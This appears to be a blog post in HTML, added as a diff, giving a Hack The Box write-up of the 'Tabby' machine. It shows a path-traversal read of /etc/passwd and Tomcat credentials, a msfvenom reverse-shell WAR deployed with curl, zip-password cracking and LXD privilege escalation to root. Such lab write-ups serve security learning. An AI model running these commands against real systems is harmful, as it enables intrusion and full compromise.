@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="K3nX">
+
+
+
+
+
+<title>Tabby</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+
+    <link rel="stylesheet" href="/css/style.css">
+
+
+
+
+    <!-- scripts list from _config.yml -->
+
+    <script src="/js/script.js"></script>
+
+    <script src="/js/tocbot.min.js"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">K3nX</a></div>
+            <div class="menu navbar-right">
+
+                    <a class="menu-item" href="/archives">Posts</a>
+
+                    <a class="menu-item" href="/category">Categories</a>
+
+                    <a class="menu-item" href="/tag">Tags</a>
+
+
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">K3nX</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+
+                    <a class="menu-item" href="/archives">Posts</a>
+
+                    <a class="menu-item" href="/category">Categories</a>
+
+                    <a class="menu-item" href="/tag">Tags</a>
+
+
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+
+
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+
+
+
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Tabby</h1>
+
+                <div class="post-meta">
+
+
+
+
+                        <span class="post-category">
+                    Category:
+
+                                <a href="/categories/Hackthebox/">Hackthebox</a>
+
+                        </span>
+
+                </div>
+
+        </header>
+
+        <div class="post-content">
+            <h3 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby - K3nX</h3><ul>
+<li>Tabby is Easy Linux Machine and ip address is 10.10.10.194 <br><img src="infocard.png" alt="Sample Image"></li>
+</ul>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="bash">#cat tabby.nmap
+# Nmap 7.80 scan initiated Mon Jun 22 20:01:05 2020 as: nmap -sSV -O -A -T4 -sC -Pn -oN tabby.nmap 10.10.10.194
+Nmap scan report for 10.10.10.194
+Host is up (0.45s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=6/22%OT=22%CT=1%CU=33848%PV=Y%DS=2%DC=T%G=Y%TM=5EF0B2C
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
+OS:1NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   424.40 ms 10.10.16.1
+2   219.71 ms 10.10.10.194
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jun 22 20:01:59 2020 -- 1 IP address (1 host up) scanned in 55.22 seconds
+
+</code></pre>
+<p>As nmap result port 22 (ssh),port 80 (apache httpd) and port 8080 (tomcat) are open</p>
+<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h3><ul>
+<li><p>Nmap result show port 80 is open let check this, I found this webpage <br><img src="web.png" alt="Sample Image"></p>
+</li>
+<li>In web page , I found the name <b>megahosting</b> , I add this ip address as megahosting.htb into my <code>/etc/hosts </code>file </li>
+<li><p>After few min checking , I found one interesting thing this is http://megahosting.htb/news.php?file=statement</p>
+</li>
+<li><p>I know this may be LFI , Let'check LFI, I tried to see /etc/passwd , Ohh Lucking I got<img src="etcpasswd.png" alt="Sample Image"></p>
+<pre><code class="bash">[root@arch /tmp]# curl http://megahosting.htb/news.php?file=../../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+tomcat:x:997:997::/opt/tomcat:/bin/false
+mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
+ash:x:1000:1000:clive:/home/ash:/bin/bash
+</code></pre>
+</li>
+<li><p>I check port 8080 tomcat , I found webpage like this <br><img src="tomcat.png" alt="Sample Image"></p>
+</li>
+<li><p>In this web page , I found tomcat user file location , I tried to see this xml file , But it's not work</p>
+</li>
+<li>I saw another dir in this tomcat webpage </li>
+<li>In this time I think this tomcat-users.xml file location shown in this webpage is <code>/etc/tomcat9/tomcat-users.xml</code> and this tomcat installed home dir is <code>/usr/share/tomcat9</code> </li>
+<li>I think this xml file location can be <code>/usr/share/tomcat9/etc/tomcat-users.xml</code></li>
+<li>Thank my fri for giving a little hint about this and I check this location </li>
+<img src="tomcatuser.png" alt="Sample Image">
+<li>Now I got tomcat username and password </li>
+<li><p>This Apache tomcat username is tomcat  and password is $3cureP4s5w0rd123! </p>
+</li>
+<li><p>I used this usernamd and password to login tomcat <br><img src="tomcatlogin.png" alt="Sample Image"></p>
+</li>
+<li><p>Login Successful</p>
+</li>
+<h3 id="Getting-Low-Priv-Shell"><a href="#Getting-Low-Priv-Shell" class="headerlink" title="Getting Low Priv Shell"></a>Getting Low Priv Shell</h3></li>
+<li><p>I think this is apache tomcat , this is writen by java , so we need java reverse shell to get shell</p>
+</li>
+<li><p>I creted reverse shell with msfvenom this file type is war, Let's go to upload </p></li>
+<li>Afer few minutes searching , I found how to upload file into tomcat server with curl command line </li>
+<pre><code class="bash"># msfvenom -p java/jsp_shell_reverse_tcp LHOST=youripaddress LPORT=9001 -f war > test.war
+Payload size: 1101 bytes
+Final size of war file: 1101 bytes
+# curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file test.war "http://megahosting.htb:8080//manager/text/deploy?path=/test.war"
+OK - Deployed application at context path [/test.war]
+</code></pre>
+<p><li>File upload successful and I call http://megahosting:8080/test.war , Boom I got reverse shell<br><img src="shell.png" alt="Sample Image"></p>
+</li>
+</ul>
+<h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><ul>
+	<li><p>I found one interesting backup.zip file in /var/www/html/files directory <br><img src="backup.png" alt="Sample Image"></p>
+</li>
+<li><p>I used curl command to download this backup, I unzip this backup.zip but this file with password we need to crack this zip file</p>
+</li>
+<li>I used johntheripper to crack this backupzip file <br> <img src="crack.png" alt="Sample Image"></li>
+<li><p>I got a password this is admin@it , After reading some hints from hackthebox forum , I know this is userpassword , I used su command to change tomcat user to user ash</p>
+</li>
+<li><p>Finally I got user access and user flag <br> <img src="user.png" alt="Sample Image"><p>
+</li>
+</ul>
+<h3 id="Privileges-Escalation-to-root"><a href="#Privileges-Escalation-to-root" class="headerlink" title="Privileges Escalation to root"></a>Privileges Escalation</h3><ul>
+<li>I used id command , I found this user contain group of lxd , I think we can use this lxd to privileges escalation</li>
+<li>I found awesome article about <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">lxd privileges escalation</a>from hacking article blog </li>
+<li>So, we downloaded the build alpine using the GitHub repose. This is build
+  alpine github repo <a href="https://github.com/saghul/lxd-alpine-builder.git">lxd alpine builder</a></li>
+<pre><code class="bash">./build-alpine
+Determining the latest release... v3.12
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
+Downloading alpine-mirrors-3.5.10-r0.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+Downloading alpine-keys-2.2-r0.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+Downloading apk-tools-static-2.10.5-r1.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
+Verified OK
+Selecting mirror http://linorg.usp.br/AlpineLinux/v3.12/main
+fetch http://linorg.usp.br/AlpineLinux/v3.12/main/x86_64/APKINDEX.tar.gz
+(1/19) Installing musl (1.1.24-r9)
+(2/19) Installing busybox (1.31.1-r19)
+Executing busybox-1.31.1-r19.post-install
+(3/19) Installing alpine-baselayout (3.2.0-r7)
+Executing alpine-baselayout-3.2.0-r7.pre-install
+Executing alpine-baselayout-3.2.0-r7.post-install
+(4/19) Installing openrc (0.42.1-r10)
+Executing openrc-0.42.1-r10.post-install
+(5/19) Installing alpine-conf (3.9.0-r1)
+(6/19) Installing libcrypto1.1 (1.1.1g-r0)
+(7/19) Installing libssl1.1 (1.1.1g-r0)
+(8/19) Installing ca-certificates-bundle (20201127-r4)
+(9/19) Installing libtls-standalone (2.9.1-r1)
+(10/19) Installing ssl_client (1.31.1-r19)
+(11/19) Installing zlib (1.2.11-r3)
+(12/19) Installing apk-tools (2.10.5-r1)
+(13/19) Installing busybox-suid (1.31.1-r19)
+(14/19) Installing busybox-initscripts (3.2-r2)
+Executing busybox-initscripts-3.2-r2.post-install
+(15/19) Installing scanelf (1.2.6-r0)
+(16/19) Installing musl-utils (1.1.24-r9)
+(17/19) Installing libc-utils (0.7.2-r3)
+(18/19) Installing alpine-keys (2.2-r0)
+(19/19) Installing alpine-base (3.12.0-r0)
+Executing busybox-1.31.1-r19.trigger
+OK: 8 MiB in 19 packages
+</code><pre>
+</ul>
+<ul>
+<li><p>After Building , I got tar file , I used python simplehttp server to move this tar file into attacking machine</p>
+<img src="alpinedownload.png" alt="Sample Image">
+</li>
+<li><p>After downloading this file and i used lxd command to privileges escalation into root</p>
+</li>
+<pre><code class="bash">ash@tabby:~$ lxc image import ./alpine.tar.gz --alias myimage
+alpine.tar.gz --alias myimage
+To start your first instance, try: lxc launch ubuntu:18.04
+
+ash@tabby:~$ lxc image list
+lxc image list
++---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |
++---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
+| myimage | 2b18709a1e70 | no     | alpine v3.12 (20200703_15:29) | x86_64       | CONTAINER | 3.05MB | Jul 3, 2020 at 9:21pm (UTC) |
++---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
+ash@tabby:~$ lxc init myimage ignite -c security.privileged=true
+lxc init myimage ignite -c security.privileged=true
+Creating ignite
+ash@tabby:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+ash@tabby:~$ lxc start ignite
+lxc start ignite
+ash@tabby:~$ lxc exec ignite /bin/sh
+~ # cd /mnt/root/root
+cd /mnt/root/root
+/mnt/root/root # ls
+ls
+root.txt  snap
+/mnt/root/root # cat root.txt
+[REDACTED]
+</code></pre>
+</ul>
+<ul>
+<li>Now I got root access into lxd container and I got root.txt flag </li>
+<li>Finally We owned this machine</li>
+</ul>
+        </div>
+
+
+            <section class="post-copyright">
+
+
+
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright K3nX (c) 2020</span>
+                    </p>
+
+
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+
+
+            </section>
+
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+
+
+                        <a href="/tags/Hackthebox/"># Hackthebox</a>
+
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+
+                <a class="prev" rel="prev" href="/"> / </a>
+
+
+            <a class="next" rel="next" href="/hackthebox/machines/cache/"> Cache </a>
+
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© K3nX </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
